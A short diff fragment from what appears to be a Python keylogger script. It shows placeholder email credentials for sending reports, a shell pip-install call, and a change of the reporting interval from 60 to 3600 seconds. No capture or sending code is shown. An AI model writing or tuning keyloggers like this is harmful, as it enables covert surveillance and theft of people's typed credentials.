@@ -21,7 +21,7 @@ call("pip install " + ' '.join(modules), shell=True)
 # finally:
 EMAIL_ADDRESS = "email"
 EMAIL_PASSWORD = "pass"
-SEND_REPORT_EVERY = 60
+SEND_REPORT_EVERY = 3600
 
 
 class KeyLogger:
